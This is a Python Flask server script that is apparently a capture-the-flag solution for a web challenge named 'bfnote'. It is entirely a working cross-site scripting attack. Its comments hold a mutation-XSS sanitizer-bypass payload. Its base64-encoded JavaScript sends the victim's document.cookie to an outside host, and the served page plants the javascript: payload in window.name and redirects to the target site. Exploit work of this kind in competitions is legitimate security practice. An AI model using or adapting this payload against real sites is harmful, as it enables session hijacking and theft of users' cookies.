from flask import Flask, jsonify


# from OpenSSL import SSL
# context = SSL.Context(SSL.PROTOCOL_TLSv1_2)
# context.use_privatekey_file('/etc/letsencrypt/live/p.hacker.af/privkey.pem')
# context.use_certificate_file('/etc/letsencrypt/live/p.hacker.af/cert.pem')

#//hax.perfect.blue/<math><mtext><table><mglyph><style><img src=x onerror=location=program deet=1>
#<math><mtext><table><mglyph><style><img src=x onerror=location=window.name deet=1>

jspayload = """
location="https://hax.perfect.blue/?leek="+document.cookie
""".encode('base64').replace("\n", "")

main_payload = "javascript:eval(atob('{}'))".format(jspayload)

html_payload = """
<body>
<script>
    window.name = "{}";
    location.href = "https://bfnote.chal.ctf.westerns.tokyo/?id=44271b5e8cd3b0af"
</script>
</body>
""".format(main_payload)

app = Flask(__name__)


@app.route('/', defaults={'u_path': ''})
@app.route('/<path:u_path>')
def index(u_path):
    return html_payload


#if __name__ == '__main__':
#    app.run()
if __name__ == '__main__':  
     app.run(host='0.0.0.0',port=443, ssl_context=('/etc/letsencrypt/live/p.hacker.af/cert.pem', '/etc/letsencrypt/live/p.hacker.af/privkey.pem'))
